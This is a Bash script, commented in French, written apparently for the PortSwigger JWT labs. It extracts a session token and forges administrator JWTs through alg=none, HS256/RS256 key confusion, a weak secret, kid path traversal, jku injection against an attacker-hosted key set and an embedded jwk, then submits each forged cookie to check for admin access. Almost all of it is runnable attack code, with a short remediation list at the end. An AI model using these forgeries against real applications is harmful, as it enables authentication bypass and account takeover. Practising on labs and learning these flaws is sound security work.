#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
JWT_COOKIE_NAME="session"
USERNAME="administrator"
PUBLIC_KEY_FILE="public.pem"
PRIVATE_KEY_FILE="private.pem"
JWK_JSON="jwk.json"
SECRET="secret"
JKU_URL="http://your-exploit-server.net/jwks.json"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Extraction du JWT depuis la réponse/cookie
extract_jwt() {
    print_sep
    echo "[1] Extraction du JWT"
    resp=$(curl -sk -I -b "$COOKIE" "$TARGET_URL")
    jwt=$(echo "$resp" | grep -i "$JWT_COOKIE_NAME=" | grep -oE '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
    if [[ -n "$jwt" ]]; then
        echo "  [+] JWT extrait : $jwt"
        export JWT="$jwt"
    else
        echo "  [-] Aucun JWT trouvé dans les cookies."
        export JWT=""
    fi
}

# 2. Décodage du JWT (header/payload)
decode_jwt() {
    print_sep
    echo "[2] Décodage du JWT"
    if [[ -n "$JWT" ]]; then
        IFS='.' read -r header payload signature <<< "$JWT"
        header_json=$(echo "$header" | base64 -d 2>/dev/null)
        payload_json=$(echo "$payload" | base64 -d 2>/dev/null)
        echo "  Header : $header_json"
        echo "  Payload: $payload_json"
        export HEADER_JSON="$header_json"
        export PAYLOAD_JSON="$payload_json"
        export HEADER_B64="$header"
        export PAYLOAD_B64="$payload"
    else
        echo "  [-] Pas de JWT à décoder."
    fi
}

# 3. Génération d'un JWT avec alg=none (attaque classique)
forge_jwt_none() {
    print_sep
    echo "[3] Génération d’un JWT avec alg=none"
    if [[ -n "$HEADER_JSON" && -n "$PAYLOAD_JSON" ]]; then
        header_none=$(echo "$HEADER_JSON" | sed 's/"alg":"[^"]*"/"alg":"none"/' | base64 | tr -d '=' | tr '/+' '_-')
        payload_mod=$(echo "$PAYLOAD_JSON" | sed "s/\"username\":\"[^\"]*\"/\"username\":\"$USERNAME\"/g" | base64 | tr -d '=' | tr '/+' '_-')
        forged_jwt="${header_none}.${payload_mod}."
        echo "  [+] JWT forgé (alg=none) : $forged_jwt"
        export FORGED_JWT="$forged_jwt"
    else
        echo "  [-] Impossible de forger le JWT (données manquantes)."
    fi
}

# 4. Génération d'un JWT HS256 signé avec clé publique (confusion HS256/RS256)
forge_jwt_hs256_with_pubkey() {
    print_sep
    echo "[4] Génération d’un JWT HS256 signé avec la clé publique (confusion HS256/RS256)"
    if [[ -f "$PUBLIC_KEY_FILE" ]]; then
        header_hs256='{"typ":"JWT","alg":"HS256"}'
        payload_mod=$(echo "$PAYLOAD_JSON" | sed "s/\"username\":\"[^\"]*\"/\"username\":\"$USERNAME\"/g")
        header_b64=$(echo -n "$header_hs256" | base64 | tr -d '=' | tr '/+' '_-')
        payload_b64=$(echo -n "$payload_mod" | base64 | tr -d '=' | tr '/+' '_-')
        pubkey=$(cat "$PUBLIC_KEY_FILE")
        signature=$(echo -n "$header_b64.$payload_b64" | openssl dgst -sha256 -hmac "$pubkey" -binary | base64 | tr -d '=' | tr '/+' '_-')
        forged_jwt="$header_b64.$payload_b64.$signature"
        echo "  [+] JWT HS256 forgé avec clé publique : $forged_jwt"
        export FORGED_JWT="$forged_jwt"
    else
        echo "  [-] Clé publique absente ($PUBLIC_KEY_FILE)."
    fi
}

# 5. Génération d'un JWT HS256 avec secret faible (attaque brute-force)
forge_jwt_hs256_weak_secret() {
    print_sep
    echo "[5] Génération d’un JWT HS256 signé avec un secret faible"
    header_hs256='{"typ":"JWT","alg":"HS256"}'
    payload_mod=$(echo "$PAYLOAD_JSON" | sed "s/\"username\":\"[^\"]*\"/\"username\":\"$USERNAME\"/g")
    header_b64=$(echo -n "$header_hs256" | base64 | tr -d '=' | tr '/+' '_-')
    payload_b64=$(echo -n "$payload_mod" | base64 | tr -d '=' | tr '/+' '_-')
    signature=$(echo -n "$header_b64.$payload_b64" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 | tr -d '=' | tr '/+' '_-')
    forged_jwt="$header_b64.$payload_b64.$signature"
    echo "  [+] JWT HS256 forgé avec secret '$SECRET' : $forged_jwt"
    export FORGED_JWT="$forged_jwt"
}

# 6. Génération d'un JWT avec KID path traversal
forge_jwt_kid_traversal() {
    print_sep
    echo "[6] Génération d’un JWT avec header KID path traversal"
    # Nécessite la valeur à cibler (ex: /proc/sys/kernel/randomize_va_space)
    KID_PATH="../../../../../../../../proc/sys/kernel/randomize_va_space"
    header_kid="{\"typ\":\"JWT\",\"alg\":\"HS256\",\"kid\":\"$KID_PATH\"}"
    payload_mod=$(echo "$PAYLOAD_JSON" | sed "s/\"username\":\"[^\"]*\"/\"username\":\"$USERNAME\"/g")
    header_b64=$(echo -n "$header_kid" | base64 | tr -d '=' | tr '/+' '_-')
    payload_b64=$(echo -n "$payload_mod" | base64 | tr -d '=' | tr '/+' '_-')
    # Pour cet exemple, on suppose que la clé est "2" (valeur du fichier)
    signature=$(echo -n "$header_b64.$payload_b64" | openssl dgst -sha256 -hmac "2" -binary | base64 | tr -d '=' | tr '/+' '_-')
    forged_jwt="$header_b64.$payload_b64.$signature"
    echo "  [+] JWT forgé avec KID path traversal : $forged_jwt"
    export FORGED_JWT="$forged_jwt"
}

# 7. Génération d'un JWT avec JKU header injection
forge_jwt_jku() {
    print_sep
    echo "[7] Génération d’un JWT avec header JKU injection"
    # Générer une paire de clés et un JWK (voir doc PortSwigger)
    # openssl genrsa -out private.pem 2048
    # openssl rsa -in private.pem -outform PEM -pubout -out public.pem
    # cat public.pem | pem-jwk > jwk.json
    # python3 -m http.server 80 (pour servir jwks.json contenant [{"...jwk..."}])
    header_jku="{\"typ\":\"JWT\",\"alg\":\"RS256\",\"jku\":\"$JKU_URL\"}"
    payload_mod=$(echo "$PAYLOAD_JSON" | sed "s/\"username\":\"[^\"]*\"/\"username\":\"$USERNAME\"/g")
    header_b64=$(echo -n "$header_jku" | base64 | tr -d '=' | tr '/+' '_-')
    payload_b64=$(echo -n "$payload_mod" | base64 | tr -d '=' | tr '/+' '_-')
    signature=$(echo -n "$header_b64.$payload_b64" | openssl dgst -sha256 -sign "$PRIVATE_KEY_FILE" | openssl base64 | tr -d '=' | tr '/+' '_-')
    forged_jwt="$header_b64.$payload_b64.$signature"
    echo "  [+] JWT forgé avec JKU header injection : $forged_jwt"
    export FORGED_JWT="$forged_jwt"
    echo "  [!] Servez votre JWKS sur $JKU_URL avec votre clé publique."
}

# 8. Génération d'un JWT avec JWK dans le header (clé privée dans le token)
forge_jwt_jwk() {
    print_sep
    echo "[8] Génération d’un JWT avec header JWK (clé privée dans le token)"
    # Générer un JWK depuis la clé privée, puis l'inclure dans le header
    JWK=$(cat "$JWK_JSON" | tr -d '\n')
    header_jwk="{\"typ\":\"JWT\",\"alg\":\"RS256\",\"jwk\":$JWK}"
    payload_mod=$(echo "$PAYLOAD_JSON" | sed "s/\"username\":\"[^\"]*\"/\"username\":\"$USERNAME\"/g")
    header_b64=$(echo -n "$header_jwk" | base64 | tr -d '=' | tr '/+' '_-')
    payload_b64=$(echo -n "$payload_mod" | base64 | tr -d '=' | tr '/+' '_-')
    signature=$(echo -n "$header_b64.$payload_b64" | openssl dgst -sha256 -sign "$PRIVATE_KEY_FILE" | openssl base64 | tr -d '=' | tr '/+' '_-')
    forged_jwt="$header_b64.$payload_b64.$signature"
    echo "  [+] JWT forgé avec JWK dans le header : $forged_jwt"
    export FORGED_JWT="$forged_jwt"
}

# 9. Injection et contrôle du JWT forgé
inject_and_control() {
    print_sep
    echo "[9] Injection et contrôle du JWT forgé"
    if [[ -n "$FORGED_JWT" ]]; then
        resp=$(curl -sk -b "$JWT_COOKIE_NAME=$FORGED_JWT" "$TARGET_URL/my-account")
        if echo "$resp" | grep -qi "Congratulations\|Welcome\|flag\|admin"; then
            echo "  [+] Succès : accès privilégié ou flag détecté !"
            echo "$resp" | grep -i "Congratulations\|Welcome\|flag\|admin" | head -n 3
        else
            echo "  [-] Pas d'effet détecté automatiquement. Analyse manuelle recommandée."
        fi
    else
        echo "  [-] Aucun JWT forgé à injecter."
    fi
}

# 10. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- N'acceptez jamais 'alg':'none' côté serveur."
    echo "- Ne confondez pas RS256/HS256 : ne vérifiez jamais un JWT HS256 avec la clé publique."
    echo "- Filtrez et validez les headers JKU/JWK/KID."
    echo "- Utilisez des secrets forts et uniques."
    echo "- Vérifiez la validité et la cohérence du header JWT côté serveur."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/jwt"
}

# 11. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Extraction et décodage du JWT."
    echo "2. Génération de JWT forgés (alg=none, HS256/RS256 confusion, KID, JKU, JWK, secret faible)."
    echo "3. Injection et contrôle automatisé de l'effet (escalade, accès admin, flag)."
    echo "4. Application des recommandations de sécurité."
    print_sep
}

# Exécution séquentielle (adapter selon le challenge)
echo "=== Script PortSwigger JWT (tous challenges) : analyse, attaque et contrôle ==="
extract_jwt
decode_jwt

# Décommentez la ligne correspondant au challenge à tester :
forge_jwt_none; inject_and_control
# forge_jwt_hs256_with_pubkey; inject_and_control
# forge_jwt_hs256_weak_secret; inject_and_control
# forge_jwt_kid_traversal; inject_and_control
# forge_jwt_jku; inject_and_control
# forge_jwt_jwk; inject_and_control

print_remediation
print_summary

# End of script
